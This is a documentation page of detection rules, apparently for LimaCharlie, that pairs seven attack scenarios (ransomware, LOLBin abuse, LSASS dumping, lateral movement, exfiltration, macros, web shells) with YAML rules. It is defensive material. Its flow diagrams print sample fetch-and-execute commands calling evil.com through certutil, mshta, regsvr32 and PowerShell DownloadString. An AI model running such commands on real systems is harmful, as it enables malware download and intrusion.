# Stateful Rule Designer - Attack Scenario Examples

This document provides complete, production-ready detection rules for common attack scenarios.

## Table of Contents

- [Example 1: Ransomware Execution Chain](#example-1-ransomware-execution-chain)
- [Example 2: Living-off-the-Land Attack](#example-2-living-off-the-land-attack)
- [Example 3: Credential Dumping Detection](#example-3-credential-dumping-detection)
- [Example 4: Lateral Movement Detection](#example-4-lateral-movement-detection)
- [Example 5: Data Staging and Exfiltration](#example-5-data-staging-and-exfiltration)
- [Example 6: Office Macro Exploitation](#example-6-office-macro-exploitation)
- [Example 7: Web Shell Upload and Execution](#example-7-web-shell-upload-and-execution)

## Example 1: Ransomware Execution Chain

### Attack Pattern

Ransomware deployment typically follows this pattern:
1. External RDP logon (Event ID 4624, Logon Type 10)
2. Unsigned executable launched from user directory
3. Mass file modifications (50+ files in 60 seconds)

### Detection Rule

```yaml
detect:
  event: WEL
  op: and
  rules:
    - op: is
      path: event/EVENT/System/EventID
      value: '4624'  # Successful logon
    - op: is
      path: event/EVENT/EventData/LogonType
      value: '10'    # RDP logon
    - op: is public address
      path: event/EVENT/EventData/IpAddress
  report latest event: true
  with events:  # Correlate proximal events (not process tree)
    event: NEW_PROCESS
    op: and
    is stateless: true
    rules:
      - op: is
        path: event/SIGNATURE/FILE_IS_SIGNED
        value: 0  # Unsigned
      - op: contains
        path: event/FILE_PATH
        value: \Users\
        case sensitive: false
    count: 1
    within: 300  # Within 5 minutes of RDP logon
    with descendant:  # Now track process tree from the unsigned process
      event: FILE_MODIFIED
      op: exists
      path: event/FILE_PATH
      count: 50
      within: 60
respond:
  - action: report
    name: "Potential Ransomware Chain: RDP -> Unsigned Exe -> Mass File Modifications"
    priority: 5
    metadata:
      mitre: T1021.001, T1486
      description: External RDP followed by unsigned binary with rapid file changes
      recommended_action: Isolate immediately and investigate
  - action: isolate network
  - action: task
    command: history_dump
    investigation: ransomware-chain
    suppression:
      is_global: false
      keys:
        - '{{ .routing.sid }}'
      max_count: 1
      period: 5m
```

### Detection Flow

```
External RDP Logon (WEL Event ID 4624, Logon Type 10, external IP)
  ⊕ (same sensor, within 5 minutes - temporal correlation via "with events")
unsigned.exe appears (NEW_PROCESS from \Users\, unsigned)
└── 50+ file modifications in 60 seconds (FILE_MODIFIED descendants in process tree)
```

### Why This Works

- **Early Detection**: Catches ransomware before significant damage
- **Three-Stage Validation**: Reduces false positives by requiring RDP + unsigned exe + file modifications
- **Correct Event Correlation**: Uses `with events` to correlate WEL logon event with process creation (not process tree relationships, but temporal correlation on same sensor)
- **Process Tree Tracking**: Once the unsigned process appears, `with descendant` tracks its process tree for file modifications
- **Automated Response**: Isolates network immediately to prevent spread
- **Investigation**: Captures historical data for forensics

**Important Note**: WEL (Windows Event Log) events are log entries, not process events, so they cannot have process tree descendants. This rule correctly uses `with events` to correlate the RDP logon with suspicious process activity that occurs on the same sensor within a time window. Once the NEW_PROCESS is detected, `with descendant` tracks its actual process tree for file modifications.

## Example 2: Living-off-the-Land Attack

### Attack Pattern

Attackers abuse legitimate Windows binaries (LOLBins) for malicious purposes:
- Office applications spawn certutil, mshta, or regsvr32
- These binaries are used with download or execution arguments
- No malware is written to disk initially

### Detection Rule

```yaml
detect:
  event: NEW_PROCESS
  op: or
  rules:
    - op: ends with
      path: event/FILE_PATH
      value: winword.exe
      case sensitive: false
    - op: ends with
      path: event/FILE_PATH
      value: excel.exe
      case sensitive: false
    - op: ends with
      path: event/FILE_PATH
      value: powerpnt.exe
      case sensitive: false
  report latest event: true
  with descendant:
    event: NEW_PROCESS
    op: or
    rules:
      # certutil downloading
      - op: and
        is stateless: true
        rules:
          - op: ends with
            path: event/FILE_PATH
            value: certutil.exe
            case sensitive: false
          - op: or
            rules:
              - op: contains
                path: event/COMMAND_LINE
                value: urlcache
                case sensitive: false
              - op: contains
                path: event/COMMAND_LINE
                value: http
                case sensitive: false
      # mshta executing remote content
      - op: and
        is stateless: true
        rules:
          - op: ends with
            path: event/FILE_PATH
            value: mshta.exe
            case sensitive: false
          - op: contains
            path: event/COMMAND_LINE
            value: http
            case sensitive: false
      # regsvr32 with scriptlet
      - op: and
        is stateless: true
        rules:
          - op: ends with
            path: event/FILE_PATH
            value: regsvr32.exe
            case sensitive: false
          - op: or
            rules:
              - op: contains
                path: event/COMMAND_LINE
                value: /i:http
                case sensitive: false
              - op: contains
                path: event/COMMAND_LINE
                value: scrobj.dll
                case sensitive: false
respond:
  - action: report
    name: "Office App Spawning LOLBin with Suspicious Arguments"
    priority: 4
    metadata:
      mitre: T1566.001, T1218
      description: Office application spawned legitimate binary for malicious purpose
  - action: task
    command: deny_tree <<routing/this>>
    suppression:
      is_global: false
      keys:
        - '{{ .routing.sid }}'
        - '{{ .event.PROCESS_ID }}'
      max_count: 1
      period: 5m
  - action: task
    command: history_dump
    investigation: lolbin-abuse
    suppression:
      is_global: false
      keys:
        - '{{ .routing.sid }}'
      max_count: 1
      period: 5m
  - action: add tag
    tag: lolbin-detected
    ttl: 3600
```

### Detection Flow

```
excel.exe
└── certutil.exe -urlcache -f http://evil.com/payload.exe
    OR
└── mshta.exe http://evil.com/malicious.hta
    OR
└── regsvr32.exe /i:http://evil.com/script.sct scrobj.dll
```

### Why This Works

- **Detects Multiple LOLBins**: Covers certutil, mshta, regsvr32
- **Context-Aware**: Only alerts when Office apps spawn these tools
- **Argument Analysis**: Checks for suspicious command-line parameters
- **Flexible**: Easily extensible to other LOLBins

## Example 3: Credential Dumping Detection

### Attack Pattern

Credential theft via memory access:
1. Process accesses LSASS memory (SENSITIVE_PROCESS_ACCESS)
2. Same sensor transfers data to external IP within 5 minutes
3. Transfer size > 10KB (credential dump size)

### Detection Rule

```yaml
detect:
  event: SENSITIVE_PROCESS_ACCESS
  op: and
  rules:
    - op: is platform
      name: windows
    - op: contains
      path: event/TARGET/FILE_PATH
      value: lsass.exe
      case sensitive: false
  report latest event: true
  with events:
    event: NETWORK_CONNECTIONS
    op: and
    rules:
      - op: is public address
        path: event/NETWORK_ACTIVITY/DESTINATION/IP_ADDRESS
      - op: is greater than
        path: event/NETWORK_ACTIVITY/BYTES_SENT
        value: 10240  # 10KB+
    count: 1
    within: 300  # Within 5 minutes
respond:
  - action: report
    name: LSASS Access Followed by External Data Transfer
    priority: 5
    metadata:
      mitre: T1003.001, T1041
      description: Potential credential dumping and exfiltration
  - action: task
    command: deny_tree <<routing/this>>
    suppression:
      is_global: false
      keys:
        - '{{ .routing.sid }}'
        - '{{ .event.PROCESS_ID }}'
      max_count: 1
      period: 5m
  - action: isolate network
  - action: task
    command: history_dump
    investigation: credential-theft
    suppression:
      is_global: false
      keys:
        - '{{ .routing.sid }}'
      max_count: 1
      period: 5m
  - action: extension request
    extension name: dumper
    extension action: dump
    extension request:
      sid: '{{ .routing.sid }}'
      pid: '{{ .event.PROCESS_ID }}'
```

### Detection Flow

```
Process accesses LSASS memory
  +
Within 5 minutes, same sensor transfers 10KB+ to external IP
  =
ALERT: Credential dumping and exfiltration
```

### Why This Works

- **Two-Stage Validation**: LSASS access + network transfer
- **Size Threshold**: Filters noise from small legitimate transfers
- **Time Window**: 5 minutes is sufficient for typical dump-and-exfil
- **Memory Dump**: Captures process memory for forensics

## Example 4: Lateral Movement Detection

### Attack Pattern

PsExec-style lateral movement:
1. Service created via ADMIN$ share (Event ID 7045)
2. Service executable path contains `\ADMIN$`
3. Process execution within 30 seconds via services.exe parent

### Detection Rule

```yaml
detect:
  event: WEL
  op: and
  rules:
    - op: is
      path: event/EVENT/System/EventID
      value: '7045'  # Service installation
    - op: is
      path: event/EVENT/System/Channel
      value: System
    - op: contains
      path: event/EVENT/EventData/ImagePath
      value: \ADMIN$
      case sensitive: false
  report latest event: true
  with events:  # Correlate proximal events (not process tree)
    event: NEW_PROCESS
    op: and
    is stateless: true
    rules:
      - op: is
        path: event/PARENT/FILE_PATH
        value: C:\Windows\System32\services.exe
      - op: contains
        path: event/FILE_PATH
        value: \ADMIN$
        case sensitive: false
    count: 1
    within: 30
respond:
  - action: report
    name: "Lateral Movement: Remote Service Creation and Execution"
    priority: 5
    metadata:
      mitre: T1021.002, T1569.002
      description: Service installed via ADMIN$ share and executed
  - action: task
    command: history_dump
    investigation: lateral-movement
    suppression:
      is_global: false
      keys:
        - '{{ .routing.sid }}'
      max_count: 1
      period: 5m
  - action: task
    command: deny_tree <<routing/this>>
    suppression:
      is_global: false
      keys:
        - '{{ .routing.sid }}'
        - '{{ .event.PROCESS_ID }}'
      max_count: 1
      period: 5m
  - action: add tag
    tag: lateral-movement-detected
    ttl: 7200
```

### Detection Flow

```
Service Creation Event (WEL Event ID 7045)
  ImagePath: \\ADMIN$\malicious.exe
  ⊕ (same sensor, within 30 seconds - temporal correlation via "with events")
NEW_PROCESS appears
  Parent: services.exe
  Path: \\ADMIN$\malicious.exe
```

### Why This Works

- **ADMIN$ Share Detection**: Strong indicator of remote execution
- **Service-Based Execution**: Classic PsExec technique
- **Correct Event Correlation**: Uses `with events` to correlate WEL service creation event with process execution (temporal correlation on same sensor, not process tree)
- **Time Correlation**: 30 seconds is typical for service start
- **Parent Validation**: services.exe parent confirms service execution

**Important Note**: WEL events are log entries and cannot have process tree descendants. This rule correctly uses `with events` to detect when a service installation event is followed by a matching process execution within 30 seconds on the same sensor.

## Example 5: Data Staging and Exfiltration

### Attack Pattern

Data exfiltration via cloud storage:
1. Archive tool used (7z.exe, winrar.exe, tar.exe)
2. Connection to file sharing service within 10 minutes
3. Targets: Dropbox, Mega, WeTransfer

### Detection Rule

```yaml
detect:
  event: NEW_PROCESS
  op: or
  rules:
    - op: ends with
      path: event/FILE_PATH
      value: 7z.exe
      case sensitive: false
    - op: ends with
      path: event/FILE_PATH
      value: winrar.exe
      case sensitive: false
    - op: and
      rules:
        - op: contains
          path: event/COMMAND_LINE
          value: tar.exe
          case sensitive: false
        - op: contains
          path: event/COMMAND_LINE
          value: " -c"
          case sensitive: false
  report latest event: true
  with descendant:
    event: NETWORK_CONNECTIONS
    op: and
    rules:
      - op: is public address
        path: event/NETWORK_ACTIVITY/DESTINATION/IP_ADDRESS
      - op: or
        rules:
          - op: contains
            path: event/DOMAIN_NAME
            value: dropbox
            case sensitive: false
          - op: contains
            path: event/DOMAIN_NAME
            value: mega.nz
            case sensitive: false
          - op: contains
            path: event/DOMAIN_NAME
            value: wetransfer
            case sensitive: false
          - op: contains
            path: event/DOMAIN_NAME
            value: transfer.sh
            case sensitive: false
          - op: contains
            path: event/DOMAIN_NAME
            value: sendspace
            case sensitive: false
    within: 600  # 10 minutes
respond:
  - action: report
    name: "Data Staging and Cloud Upload Detected"
    priority: 4
    metadata:
      mitre: T1560, T1567.002
      description: Archive tool used followed by connection to file sharing service
  - action: task
    command: history_dump
    investigation: data-exfiltration
    suppression:
      is_global: false
      keys:
        - '{{ .routing.sid }}'
      max_count: 1
      period: 5m
  - action: add tag
    tag: potential-exfiltration
    ttl: 7200
  - action: task
    command: segregate_network
    suppression:
      is_global: false
      keys:
        - '{{ .routing.sid }}'
      max_count: 1
      period: 1h
```

### Detection Flow

```
7z.exe -a sensitive_data.7z
  |
  | (within 10 minutes)
  v
NETWORK_CONNECTION to mega.nz
```

### Why This Works

- **Multiple Archive Tools**: Covers 7z, WinRAR, tar
- **Known Exfil Services**: Targets common file sharing platforms
- **Time Window**: 10 minutes allows for compression time
- **Process Tree**: Detects upload anywhere in archive tool's descendants

## Example 6: Office Macro Exploitation

### Attack Pattern

Multi-stage Office document exploitation:
1. Office application launches
2. Spawns PowerShell (possibly via intermediaries)
3. PowerShell uses encoded commands or download functions

### Detection Rule

```yaml
detect:
  event: NEW_PROCESS
  op: or
  rules:
    - op: ends with
      path: event/FILE_PATH
      value: winword.exe
      case sensitive: false
    - op: ends with
      path: event/FILE_PATH
      value: excel.exe
      case sensitive: false
    - op: ends with
      path: event/FILE_PATH
      value: powerpnt.exe
      case sensitive: false
    - op: ends with
      path: event/FILE_PATH
      value: outlook.exe
      case sensitive: false
  report latest event: true
  with descendant:
    event: NEW_PROCESS
    op: and
    is stateless: true
    rules:
      - op: ends with
        path: event/FILE_PATH
        value: powershell.exe
        case sensitive: false
      - op: or
        rules:
          - op: contains
            path: event/COMMAND_LINE
            value: -enc
            case sensitive: false
          - op: contains
            path: event/COMMAND_LINE
            value: -encodedcommand
            case sensitive: false
          - op: contains
            path: event/COMMAND_LINE
            value: downloadstring
            case sensitive: false
          - op: contains
            path: event/COMMAND_LINE
            value: downloadfile
            case sensitive: false
          - op: contains
            path: event/COMMAND_LINE
            value: webclient
            case sensitive: false
          - op: contains
            path: event/COMMAND_LINE
            value: bitstransfer
            case sensitive: false
respond:
  - action: report
    name: Office Application Process Tree Contains Encoded/Download PowerShell
    priority: 5
    metadata:
      mitre: T1059.001, T1566.001
      description: Office app spawned PowerShell with encoded/download commands
  - action: task
    command: deny_tree <<routing/this>>
    suppression:
      is_global: false
      keys:
        - '{{ .routing.sid }}'
        - '{{ .event.PROCESS_ID }}'
      max_count: 1
      period: 5m
  - action: isolate network
  - action: task
    command: history_dump
    investigation: office-powershell-exploit
    suppression:
      is_global: false
      keys:
        - '{{ .routing.sid }}'
      max_count: 1
      period: 5m
```

### Detection Flow

```
excel.exe
└── [intermediary processes]
    └── powershell.exe -enc <base64_payload>
        OR
    └── powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString(...)"
```

### Why This Works

- **with_descendant**: Catches PowerShell even through intermediaries
- **Multiple Indicators**: Detects various PowerShell abuse techniques
- **is stateless: true**: Ensures both PowerShell AND suspicious args in same event
- **Kills PowerShell Process**: Terminates the malicious PowerShell process and its descendants
- **Network Isolation**: Prevents further malicious activity even if Office app continues running

**Important Note**: When using `with descendant` with potential intermediary processes, `<<routing/parent>>` references the immediate parent of PowerShell in the process tree, not the root Office application. This rule terminates the malicious PowerShell process. To terminate the entire Office process tree, you would need to use `with child` (limiting detection to direct children only) or accept that only the malicious descendant process will be killed. Network isolation provides additional protection regardless.

## Example 7: Web Shell Upload and Execution

### Attack Pattern

Web server compromise and shell execution:
1. Web server process (w3wp.exe, nginx, apache) spawns unexpected child
2. Child is a shell (cmd.exe, powershell.exe, sh, bash)
3. Shell has suspicious arguments or creates network connections

### Detection Rule

```yaml
detect:
  event: NEW_PROCESS
  op: or
  rules:
    - op: ends with
      path: event/FILE_PATH
      value: w3wp.exe
      case sensitive: false
    - op: ends with
      path: event/FILE_PATH
      value: httpd.exe
      case sensitive: false
    - op: contains
      path: event/FILE_PATH
      value: /nginx
    - op: contains
      path: event/FILE_PATH
      value: /apache
  report latest event: true
  with child:
    event: NEW_PROCESS
    op: or
    rules:
      - op: ends with
        path: event/FILE_PATH
        value: cmd.exe
        case sensitive: false
      - op: ends with
        path: event/FILE_PATH
        value: powershell.exe
        case sensitive: false
      - op: ends with
        path: event/FILE_PATH
        value: bash
      - op: ends with
        path: event/FILE_PATH
        value: sh
      - op: ends with
        path: event/FILE_PATH
        value: perl
      - op: ends with
        path: event/FILE_PATH
        value: python
respond:
  - action: report
    name: "Web Server Spawning Shell Process"
    priority: 5
    metadata:
      mitre: T1190, T1505.003
      description: Web server spawned command shell - possible web shell execution
      recommended_action: Investigate web server logs and recently modified web files
  - action: task
    command: deny_tree <<routing/this>>
    suppression:
      is_global: false
      keys:
        - '{{ .routing.sid }}'
        - '{{ .event.PROCESS_ID }}'
      max_count: 1
      period: 5m
  - action: task
    command: history_dump
    investigation: web-shell
    suppression:
      is_global: false
      keys:
        - '{{ .routing.sid }}'
      max_count: 1
      period: 5m
  - action: add tag
    tag: web-shell-detected
    ttl: 7200
```

### Detection Flow

```
w3wp.exe (IIS worker process)
└── cmd.exe /c whoami
    OR
└── powershell.exe -c "Get-ChildItem C:\"
```

### Why This Works

- **Unexpected Parent-Child**: Web servers shouldn't spawn shells
- **Multiple Web Servers**: Covers IIS, Apache, nginx
- **Multiple Shells**: Detects Windows and Linux shells
- **Direct Child Only**: Uses `with child` for precision (web shells spawn direct children)

---

## Testing These Examples

All examples should be tested before deployment:

1. **Validate Syntax**: `limacharlie replay --validate --rule-content rule.yaml`
2. **Unit Tests**: Add test cases to the rule's `tests:` section
3. **Synthetic Testing**: Create test events and replay
4. **Non-Production Testing**: Deploy to test organization first
5. **Monitor Performance**: Check memory/CPU impact

For detailed testing instructions, see [TROUBLESHOOTING.md](TROUBLESHOOTING.md).

## Customization Tips

### Adjust Thresholds

Modify `count` and `within` parameters based on your environment:

```yaml
# More sensitive (lower threshold)
count: 3
within: 30

# Less sensitive (higher threshold)
count: 20
within: 300
```

### Add Platform Specificity

Filter to specific platforms:

```yaml
detect:
  event: NEW_PROCESS
  op: and
  rules:
    - op: is platform
      name: windows  # or linux, macos
    # ... rest of rule ...
```

### Customize Responses

Adjust actions based on your security posture:

```yaml
# Conservative (alert only)
respond:
  - action: report
    name: Detection Name
    priority: 3

# Moderate (alert + investigate)
respond:
  - action: report
    name: Detection Name
    priority: 4
  - action: task
    command: history_dump
    investigation: scenario-name

# Aggressive (alert + isolate)
respond:
  - action: report
    name: Detection Name
    priority: 5
  - action: task
    command: deny_tree <<routing/this>>
  - action: isolate network
```

---

These examples provide production-ready detection rules for common attack scenarios. Customize them for your environment and always test thoroughly before deployment. For complete operator reference, see [REFERENCE.md](REFERENCE.md).
